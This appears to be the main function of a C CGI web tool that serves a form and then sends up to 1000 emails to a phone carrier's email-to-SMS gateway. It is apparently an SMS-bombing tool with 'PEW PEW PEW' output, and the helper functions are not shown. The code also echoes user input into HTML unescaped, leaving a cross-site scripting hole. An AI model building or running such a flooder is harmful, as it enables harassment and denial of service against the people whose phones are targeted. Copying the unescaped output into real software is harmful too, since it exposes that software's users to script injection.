int main() {
    char *method = getenv("REQUEST_METHOD");
    if (method == NULL) {
        printf("Content-Type: text/plain\r\n\r\n");
        printf("Error: REQUEST_METHOD not set\n");
        return 1;
    }

    if (strcmp(method, "GET") == 0) {
        /* Serve the HTML form */
        print_html_form();
    } else if (strcmp(method, "POST") == 0) {
        /* Get POST data */
        char *content_length_str = getenv("CONTENT_LENGTH");
        if (content_length_str == NULL) {
            printf("Content-Type: text/plain\r\n\r\n");
            printf("Error: CONTENT_LENGTH not set\n");
            return 1;
        }

        int content_length = atoi(content_length_str);
        if (content_length <= 0 || content_length > 4096) {
            printf("Content-Type: text/plain\r\n\r\n");
            printf("Error: Invalid CONTENT_LENGTH\n");
            return 1;
        }

        char *post_data = malloc(content_length + 1);
        if (post_data == NULL) {
            printf("Content-Type: text/plain\r\n\r\n");
            printf("Error: Memory allocation failed\n");
            return 1;
        }

        fread(post_data, 1, content_length, stdin);
        post_data[content_length] = '\0';

        /* Parse POST data */
        char number[256] = "", provider[256] = "", shots[256] = "", sender[256] = "", subject[256] = "", msg[256] = "";
        parse_post_data(post_data, number, provider, shots, sender, subject, msg);

        /* Construct recipient email */
        char to[512];
        snprintf(to, sizeof(to), "%s%s", number, provider);

        /* Output response */
        printf("Content-Type: text/html\r\n\r\n");
        printf("<!DOCTYPE html>\n<html><body>\n");
        printf("<div>PEW PEW PEW - %s</div>\n", to);

        /* Send emails */
        int shots_num = atoi(shots);
        if (shots_num > 0 && shots_num <= 1000) { /* Limit to prevent abuse */
            curl_global_init(CURL_GLOBAL_ALL);
            for (int i = 0; i < shots_num; i++) {
                send_email(to, sender, subject, msg, provider);
            }
            curl_global_cleanup();
            printf("<p>%d messages sent.</p>\n", shots_num);
        } else {
            printf("<p>Error: Invalid number of shots.</p>\n");
        }

        printf("</body></html>\n");

        free(post_data);
    } else {
        printf("Content-Type: text/plain\r\n\r\n");
        printf("Error: Unsupported REQUEST_METHOD\n");
        return 1;
    }

    return 0;
}
